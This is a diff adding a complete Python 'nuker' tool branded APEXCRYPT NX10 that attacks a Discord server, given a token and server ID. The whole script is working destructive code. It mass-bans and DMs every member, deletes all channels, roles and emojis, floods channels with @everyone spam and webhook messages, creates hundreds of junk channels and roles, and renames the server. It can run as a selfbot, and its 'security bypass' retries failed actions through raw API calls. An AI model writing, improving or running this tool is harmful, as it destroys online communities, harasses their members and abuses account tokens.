@@ -1,0 +1,556 @@
+import discord
+from discord.ext import commands
+import asyncio
+import aiohttp
+import os
+import sys
+import time
+import random
+import base64
+from colorama import Fore, Back, Style, init
+
+init(autoreset=True)
+
+# ═══════════════════════════════════════════════════════════════
+# APEXCRYPT NUKER NX10  •  ULTRA SPEED  •  SECURITY BYPASS
+# ═══════════════════════════════════════════════════════════════
+
+BANNER = f"""
+{Fore.RED}
+    █████╗ ██████╗ ███████╗██╗  ██╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗
+   ██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
+   ███████║██████╔╝█████╗   ╚███╔╝ ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
+   ██╔══██║██╔═══╝ ██╔══╝   ██╔██╗ ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
+   ██║  ██║██║     ███████╗██╔╝ ██╗╚██████╗██║  ██║   ██║   ██║        ██║   
+   ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   
+{Fore.MAGENTA}
+              ███╗   ██╗██╗  ██╗ ██╗ ██████╗ 
+              ████╗  ██║╚██╗██╔╝███║██╔═████╗
+              ██╔██╗ ██║ ╚███╔╝ ╚██║██║██╔██║
+              ██║╚██╗██║ ██╔██╗  ██║████╔╝██║
+              ██║ ╚████║██╔╝ ██╗ ██║╚██████╔╝
+              ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═╝ ╚═════╝ 
+{Fore.CYAN}        ════════════════════════════════════════════
+{Fore.WHITE}         ULTRA SPEED • SECURITY BYPASS • LIVE RADAR
+{Fore.CYAN}        ════════════════════════════════════════════
+{Style.RESET_ALL}
+"""
+
+class LiveRadar:
+    def __init__(self):
+        self.bans = 0
+        self.channels_created = 0
+        self.channels_deleted = 0
+        self.roles_created = 0
+        self.roles_deleted = 0
+        self.emojis_created = 0
+        self.emojis_deleted = 0
+        self.messages_sent = 0
+        self.webhooks_created = 0
+        self.dms_sent = 0
+        self.start_time = time.time()
+        self.recent_bans = []
+        self.recent_actions = []
+        self.lock = asyncio.Lock()
+
+    async def log_ban(self, user):
+        async with self.lock:
+            self.bans += 1
+            name = str(user)
+            self.recent_bans.append(name)
+            if len(self.recent_bans) > 12:
+                self.recent_bans.pop(0)
+            self.recent_actions.append(f"{Fore.RED}[BAN] {name}")
+
+    async def log_channel(self, action, name=""):
+        async with self.lock:
+            if action == "create":
+                self.channels_created += 1
+                self.recent_actions.append(f"{Fore.GREEN}[CH+] {name}")
+            else:
+                self.channels_deleted += 1
+                self.recent_actions.append(f"{Fore.YELLOW}[CH-] {name}")
+
+    async def log_role(self, action, name=""):
+        async with self.lock:
+            if action == "create":
+                self.roles_created += 1
+                self.recent_actions.append(f"{Fore.MAGENTA}[RL+] {name}")
+            else:
+                self.roles_deleted += 1
+                self.recent_actions.append(f"{Fore.YELLOW}[RL-] {name}")
+
+    async def log_emoji(self, action, name=""):
+        async with self.lock:
+            if action == "create":
+                self.emojis_created += 1
+                self.recent_actions.append(f"{Fore.CYAN}[EM+] {name}")
+            else:
+                self.emojis_deleted += 1
+                self.recent_actions.append(f"{Fore.YELLOW}[EM-] {name}")
+
+    async def log_msg(self):
+        async with self.lock:
+            self.messages_sent += 1
+
+    async def log_dm(self):
+        async with self.lock:
+            self.dms_sent += 1
+
+    async def log_webhook(self):
+        async with self.lock:
+            self.webhooks_created += 1
+
+    def render(self):
+        elapsed = int(time.time() - self.start_time)
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(BANNER)
+        print(f"{Fore.CYAN}╔════════════════════════════ LIVE RADAR MATRIX NX10 ════════════════════════════╗")
+        print(f"{Fore.CYAN}║ {Fore.WHITE}Runtime {elapsed:>4}s │ Bans {Fore.RED}{self.bans:<5} {Fore.WHITE}│ CH+ {Fore.GREEN}{self.channels_created:<4} {Fore.WHITE}│ RL+ {Fore.MAGENTA}{self.roles_created:<4} {Fore.WHITE}│ EM+ {Fore.CYAN}{self.emojis_created:<3} {Fore.WHITE}│ MSG {Fore.YELLOW}{self.messages_sent:<5} {Fore.WHITE}│ DM {Fore.RED}{self.dms_sent:<4} {Fore.CYAN}║")
+        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════════════════╣")
+        print(f"{Fore.CYAN}║ {Fore.RED}RECENT BANS (live):{Style.RESET_ALL}")
+        for b in self.recent_bans[-7:]:
+            print(f"{Fore.CYAN}║   {Fore.RED}» banned ({b})")
+        print(f"{Fore.CYAN}║")
+        print(f"{Fore.CYAN}║ {Fore.WHITE}LIVE FEED:{Style.RESET_ALL}")
+        for a in self.recent_actions[-10:]:
+            print(f"{Fore.CYAN}║   {a}")
+        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝")
+        print(f"{Fore.MAGENTA}  APEXCRYPT NUKER NX10 │ ULTRA SPEED │ SECURITY BYPASS │ discord.gg/nullstate{Style.RESET_ALL}\n")
+
+radar = LiveRadar()
+
+class Nuker:
+    def __init__(self, token, guild_id):
+        self.token = token
+        self.guild_id = int(guild_id)
+        self.bot = commands.Bot(command_prefix="!", self_bot=True)
+        self.session = None
+        self.headers = {
+            "Authorization": token if token.startswith("Bot ") else token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+        self.ban_reason = "APEXCRYPT NX10"
+        self.dm_template = "[{user}] {reason}"
+
+    async def start_session(self):
+        self.session = aiohttp.ClientSession(headers=self.headers)
+
+    async def close_session(self):
+        if self.session and not self.session.closed:
+            await self.session.close()
+
+    # ─── SECURITY BYPASS HELPERS ─────────────────────────────────
+    async def raw_ban(self, guild_id, user_id, reason):
+        try:
+            async with self.session.put(
+                f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}",
+                json={"delete_message_days": 0, "reason": reason}
+            ) as r:
+                return r.status in (200, 204)
+        except:
+            return False
+
+    async def raw_kick(self, guild_id, user_id, reason):
+        try:
+            async with self.session.delete(
+                f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
+                json={"reason": reason}
+            ) as r:
+                return r.status in (200, 204)
+        except:
+            return False
+
+    # ─── MASS BAN + DM ───────────────────────────────────────────
+    async def mass_ban(self, guild, reason=None, dm_text=None):
+        reason = reason or self.ban_reason
+        dm_text = dm_text or self.dm_template
+        members = [m for m in guild.members if m.id != self.bot.user.id]
+        print(f"{Fore.RED}[!] Mass Ban + DM → {len(members)} targets (bypass mode)")
+        sem = asyncio.Semaphore(60)
+
+        async def ban_one(member):
+            async with sem:
+                # DM first
+                try:
+                    msg = dm_text.replace("{user}", str(member)).replace("{reason}", reason)
+                    await member.send(msg)
+                    await radar.log_dm()
+                except:
+                    pass
+                # Ban via library then raw API (bypass)
+                try:
+                    await guild.ban(member, reason=reason, delete_message_days=0)
+                    await radar.log_ban(member)
+                except:
+                    if await self.raw_ban(guild.id, member.id, reason):
+                        await radar.log_ban(member)
+
+        await asyncio.gather(*[ban_one(m) for m in members], return_exceptions=True)
+
+    # ─── CHANNEL CREATE (ULTRA) ──────────────────────────────────
+    async def mass_channel_create(self, guild, prefix, amount):
+        print(f"{Fore.GREEN}[!] Channel create x{amount} prefix={prefix}")
+        sem = asyncio.Semaphore(45)
+
+        async def create_one(i):
+            async with sem:
+                name = f"{prefix}-{i}" if amount > 1 else prefix
+                try:
+                    ch = await guild.create_text_channel(name)
+                    await radar.log_channel("create", ch.name)
+                except:
+                    try:
+                        async with self.session.post(
+                            f"https://discord.com/api/v9/guilds/{guild.id}/channels",
+                            json={"name": name, "type": 0}
+                        ) as r:
+                            if r.status == 201:
+                                data = await r.json()
+                                await radar.log_channel("create", data.get("name", name))
+                    except:
+                        pass
+
+        await asyncio.gather(*[create_one(i) for i in range(amount)], return_exceptions=True)
+
+    async def mass_channel_delete(self, guild):
+        channels = list(guild.channels)
+        print(f"{Fore.YELLOW}[!] Deleting {len(channels)} channels")
+        sem = asyncio.Semaphore(50)
+
+        async def del_one(ch):
+            async with sem:
+                try:
+                    await ch.delete()
+                    await radar.log_channel("delete", getattr(ch, "name", str(ch.id)))
+                except:
+                    try:
+                        async with self.session.delete(f"https://discord.com/api/v9/channels/{ch.id}") as r:
+                            if r.status in (200, 204):
+                                await radar.log_channel("delete", getattr(ch, "name", str(ch.id)))
+                    except:
+                        pass
+
+        await asyncio.gather(*[del_one(c) for c in channels], return_exceptions=True)
+
+    # ─── ROLE CREATE / DELETE ────────────────────────────────────
+    async def mass_role_create(self, guild, prefix, amount):
+        print(f"{Fore.MAGENTA}[!] Role create x{amount}")
+        sem = asyncio.Semaphore(35)
+
+        async def create_one(i):
+            async with sem:
+                name = f"{prefix}-{i}"
+                try:
+                    role = await guild.create_role(name=name, colour=discord.Colour.random())
+                    await radar.log_role("create", role.name)
+                except:
+                    try:
+                        async with self.session.post(
+                            f"https://discord.com/api/v9/guilds/{guild.id}/roles",
+                            json={"name": name, "color": random.randint(0, 0xFFFFFF)}
+                        ) as r:
+                            if r.status == 200:
+                                data = await r.json()
+                                await radar.log_role("create", data.get("name", name))
+                    except:
+                        pass
+
+        await asyncio.gather(*[create_one(i) for i in range(amount)], return_exceptions=True)
+
+    async def mass_role_delete(self, guild):
+        roles = [r for r in guild.roles if r.name != "@everyone" and not r.managed]
+        print(f"{Fore.YELLOW}[!] Deleting {len(roles)} roles")
+        sem = asyncio.Semaphore(40)
+
+        async def del_one(role):
+            async with sem:
+                try:
+                    await role.delete()
+                    await radar.log_role("delete", role.name)
+                except:
+                    try:
+                        async with self.session.delete(
+                            f"https://discord.com/api/v9/guilds/{guild.id}/roles/{role.id}"
+                        ) as r:
+                            if r.status in (200, 204):
+                                await radar.log_role("delete", role.name)
+                    except:
+                        pass
+
+        await asyncio.gather(*[del_one(r) for r in roles], return_exceptions=True)
+
+    # ─── EMOJI SPAM ──────────────────────────────────────────────
+    async def mass_emoji_create(self, guild, prefix, amount):
+        # uses a tiny 1x1 png base64 so no external file needed
+        tiny_png = base64.b64decode(
+            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
+        )
+        print(f"{Fore.CYAN}[!] Emoji create x{amount}")
+        sem = asyncio.Semaphore(15)
+
+        async def create_one(i):
+            async with sem:
+                name = f"{prefix}{i}"[:32]
+                try:
+                    emoji = await guild.create_custom_emoji(name=name, image=tiny_png)
+                    await radar.log_emoji("create", emoji.name)
+                except:
+                    pass
+
+        await asyncio.gather(*[create_one(i) for i in range(amount)], return_exceptions=True)
+
+    async def mass_emoji_delete(self, guild):
+        emojis = list(guild.emojis)
+        print(f"{Fore.YELLOW}[!] Deleting {len(emojis)} emojis")
+        for e in emojis:
+            try:
+                await e.delete()
+                await radar.log_emoji("delete", e.name)
+            except:
+                pass
+
+    # ─── MESSAGE SPAM (20+/sec target) ───────────────────────────
+    async def mass_message_spam(self, guild, content, amount_per_channel):
+        channels = [c for c in guild.text_channels]
+        print(f"{Fore.YELLOW}[!] Msg spam {amount_per_channel}/ch × {len(channels)} channels (ultra)")
+        sem = asyncio.Semaphore(80)
+
+        async def spam_ch(ch):
+            for _ in range(amount_per_channel):
+                async with sem:
+                    try:
+                        await ch.send(content)
+                        await radar.log_msg()
+                    except:
+                        try:
+                            async with self.session.post(
+                                f"https://discord.com/api/v9/channels/{ch.id}/messages",
+                                json={"content": content}
+                            ) as r:
+                                if r.status == 200:
+                                    await radar.log_msg()
+                        except:
+                            pass
+
+        await asyncio.gather(*[spam_ch(c) for c in channels], return_exceptions=True)
+
+    # ─── WEBHOOK SPAM ────────────────────────────────────────────
+    async def webhook_spam(self, guild, content, amount):
+        channels = [c for c in guild.text_channels]
+        print(f"{Fore.CYAN}[!] Webhook spam x{amount}")
+        for ch in channels:
+            try:
+                wh = await ch.create_webhook(name="APEXCRYPT")
+                await radar.log_webhook()
+                for _ in range(amount):
+                    await wh.send(content)
+                    await radar.log_msg()
+                await wh.delete()
+            except:
+                pass
+
+    # ─── SERVER EDIT ─────────────────────────────────────────────
+    async def rename_server(self, guild, new_name):
+        try:
+            await guild.edit(name=new_name)
+            print(f"{Fore.GREEN}[+] Server name → {new_name}")
+        except Exception as e:
+            print(f"{Fore.RED}[-] Rename failed: {e}")
+
+    async def change_vanity(self, guild, code):
+        try:
+            async with self.session.patch(
+                f"https://discord.com/api/v9/guilds/{guild.id}/vanity-url",
+                json={"code": code}
+            ) as r:
+                if r.status == 200:
+                    print(f"{Fore.GREEN}[+] Vanity → discord.gg/{code}")
+                else:
+                    print(f"{Fore.RED}[-] Vanity failed (needs boosts)")
+        except:
+            print(f"{Fore.RED}[-] Vanity error")
+
+    # ─── FULL NUKE ───────────────────────────────────────────────
+    async def full_nuke(self, guild, cfg):
+        print(f"{Fore.RED}[!!!] FULL NUKE ENGAGED — SECURITY BYPASS ACTIVE")
+        if cfg.get("del_ch"):
+            await self.mass_channel_delete(guild)
+        if cfg.get("del_roles"):
+            await self.mass_role_delete(guild)
+        if cfg.get("del_emojis"):
+            await self.mass_emoji_delete(guild)
+        if cfg.get("ban"):
+            await self.mass_ban(guild, cfg.get("reason"), cfg.get("dm_text"))
+        if cfg.get("create_ch"):
+            await self.mass_channel_create(guild, cfg.get("ch_prefix", "nuked"), cfg.get("ch_amt", 50))
+        if cfg.get("create_roles"):
+            await self.mass_role_create(guild, cfg.get("role_prefix", "nuked"), cfg.get("role_amt", 200))
+        if cfg.get("create_emojis"):
+            await self.mass_emoji_create(guild, cfg.get("emoji_prefix", "nx"), cfg.get("emoji_amt", 30))
+        if cfg.get("spam"):
+            await self.mass_message_spam(guild, cfg.get("spam_msg", "@everyone APEXCRYPT NX10"), cfg.get("spam_amt", 25))
+        if cfg.get("webhook"):
+            await self.webhook_spam(guild, cfg.get("spam_msg", "@everyone APEXCRYPT"), cfg.get("wh_amt", 10))
+        if cfg.get("rename"):
+            await self.rename_server(guild, cfg.get("new_name", "APEXCRYPT NUKED"))
+        print(f"{Fore.GREEN}[✓] FULL NUKE COMPLETE")
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def menu():
+    clear()
+    print(BANNER)
+    print(f"""
+{Fore.CYAN}╔══════════════════════════ APEXCRYPT NX10 PANEL ══════════════════════════╗
+{Fore.WHITE}
+  [1]  Mass Ban + DM Spam          [6]  Message Spam (ultra 20+/s)
+  [2]  Channel Create Spam         [7]  Webhook Spam
+  [3]  Channel Delete All          [8]  Rename Server / Vanity
+  [4]  Role Create Spam            [9]  Emoji Create / Delete
+  [5]  Role Delete All             [0]  FULL NUKE (everything)
+{Fore.CYAN}
+  [X]  Exit
+{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════╝
+{Style.RESET_ALL}""")
+
+async def main():
+    clear()
+    print(BANNER)
+    print(f"{Fore.YELLOW}[*] APEXCRYPT NUKER NX10 boot...")
+    token = input(f"{Fore.CYAN}[>] Token (bot / user / selfbot): {Style.RESET_ALL}").strip()
+    guild_id = input(f"{Fore.CYAN}[>] Server ID: {Style.RESET_ALL}").strip()
+
+    if not token or not guild_id:
+        print(f"{Fore.RED}[!] Token or Server ID missing → refusing to open.")
+        time.sleep(2)
+        sys.exit(1)
+
+    nuker = Nuker(token, guild_id)
+    await nuker.start_session()
+
+    @nuker.bot.event
+    async def on_ready():
+        print(f"{Fore.GREEN}[+] Logged as {nuker.bot.user}")
+        guild = nuker.bot.get_guild(nuker.guild_id)
+        if not guild:
+            print(f"{Fore.RED}[!] Server not found / no access. Closing.")
+            await nuker.close_session()
+            await nuker.bot.close()
+            return
+
+        async def radar_loop():
+            while True:
+                radar.render()
+                await asyncio.sleep(0.7)
+
+        asyncio.create_task(radar_loop())
+
+        while True:
+            menu()
+            choice = input(f"{Fore.CYAN}[>] Option: {Style.RESET_ALL}").strip().lower()
+
+            if choice == "1":
+                reason = input(f"{Fore.CYAN}Ban reason: {Style.RESET_ALL}") or "APEXCRYPT NX10"
+                dm = input(f"{Fore.CYAN}DM template (use {{user}} {{reason}}): {Style.RESET_ALL}") or "[{user}] {reason}"
+                nuker.ban_reason = reason
+                nuker.dm_template = dm
+                await nuker.mass_ban(guild, reason, dm)
+
+            elif choice == "2":
+                prefix = input(f"{Fore.CYAN}Channel prefix: {Style.RESET_ALL}") or "nuked"
+                amt = int(input(f"{Fore.CYAN}Amount: {Style.RESET_ALL}") or "100")
+                await nuker.mass_channel_create(guild, prefix, amt)
+
+            elif choice == "3":
+                await nuker.mass_channel_delete(guild)
+
+            elif choice == "4":
+                prefix = input(f"{Fore.CYAN}Role prefix: {Style.RESET_ALL}") or "nuked"
+                amt = int(input(f"{Fore.CYAN}Amount (500-700+ target): {Style.RESET_ALL}") or "500")
+                await nuker.mass_role_create(guild, prefix, amt)
+
+            elif choice == "5":
+                await nuker.mass_role_delete(guild)
+
+            elif choice == "6":
+                msg = input(f"{Fore.CYAN}Message: {Style.RESET_ALL}") or "@everyone APEXCRYPT NX10"
+                amt = int(input(f"{Fore.CYAN}Msgs per channel (ultra): {Style.RESET_ALL}") or "30")
+                await nuker.mass_message_spam(guild, msg, amt)
+
+            elif choice == "7":
+                msg = input(f"{Fore.CYAN}Webhook msg: {Style.RESET_ALL}") or "@everyone APEXCRYPT"
+                amt = int(input(f"{Fore.CYAN}Amount: {Style.RESET_ALL}") or "15")
+                await nuker.webhook_spam(guild, msg, amt)
+
+            elif choice == "8":
+                new = input(f"{Fore.CYAN}New server name: {Style.RESET_ALL}") or "APEXCRYPT NUKED"
+                await nuker.rename_server(guild, new)
+                vanity = input(f"{Fore.CYAN}Vanity code (empty skip): {Style.RESET_ALL}").strip()
+                if vanity:
+                    await nuker.change_vanity(guild, vanity)
+
+            elif choice == "9":
+                sub = input(f"{Fore.CYAN}[c]reate / [d]elete emojis: {Style.RESET_ALL}").lower()
+                if sub == "c":
+                    prefix = input(f"{Fore.CYAN}Emoji prefix: {Style.RESET_ALL}") or "nx"
+                    amt = int(input(f"{Fore.CYAN}Amount: {Style.RESET_ALL}") or "40")
+                    await nuker.mass_emoji_create(guild, prefix, amt)
+                else:
+                    await nuker.mass_emoji_delete(guild)
+
+            elif choice == "0":
+                print(f"{Fore.RED}FULL NUKE CONFIG")
+                cfg = {
+                    "ban": input("Mass ban + DM? (y/n): ").lower() != "n",
+                    "reason": input("Ban reason: ") or "APEXCRYPT NX10",
+                    "dm_text": input("DM template {{user}} {{reason}}: ") or "[{user}] {reason}",
+                    "del_ch": input("Delete channels? (y/n): ").lower() != "n",
+                    "create_ch": input("Create channels? (y/n): ").lower() != "n",
+                    "ch_prefix": input("Channel prefix: ") or "nuked",
+                    "ch_amt": int(input("Channel amount: ") or "80"),
+                    "del_roles": input("Delete roles? (y/n): ").lower() != "n",
+                    "create_roles": input("Create roles? (y/n): ").lower() != "n",
+                    "role_prefix": input("Role prefix: ") or "nuked",
+                    "role_amt": int(input("Role amount: ") or "300"),
+                    "del_emojis": input("Delete emojis? (y/n): ").lower() != "n",
+                    "create_emojis": input("Create emojis? (y/n): ").lower() != "n",
+                    "emoji_prefix": input("Emoji prefix: ") or "nx",
+                    "emoji_amt": int(input("Emoji amount: ") or "30"),
+                    "spam": input("Msg spam? (y/n): ").lower() != "n",
+                    "spam_msg": input("Spam message: ") or "@everyone APEXCRYPT NX10",
+                    "spam_amt": int(input("Msgs/channel: ") or "25"),
+                    "webhook": input("Webhook spam? (y/n): ").lower() != "n",
+                    "wh_amt": int(input("Webhook amount: ") or "10"),
+                    "rename": input("Rename server? (y/n): ").lower() != "n",
+                    "new_name": input("New name: ") or "APEXCRYPT NUKED"
+                }
+                await nuker.full_nuke(guild, cfg)
+
+            elif choice == "x":
+                print(f"{Fore.YELLOW}[!] Shutting down...")
+                await nuker.close_session()
+                await nuker.bot.close()
+                break
+            else:
+                print(f"{Fore.RED}Invalid")
+            input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
+
+    try:
+        await nuker.bot.start(token)
+    except discord.LoginFailure:
+        print(f"{Fore.RED}[!] Invalid token → nuker will not open.")
+        await nuker.close_session()
+        sys.exit(1)
+    except Exception as e:
+        print(f"{Fore.RED}[!] {e}")
+        await nuker.close_session()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] Interrupted")
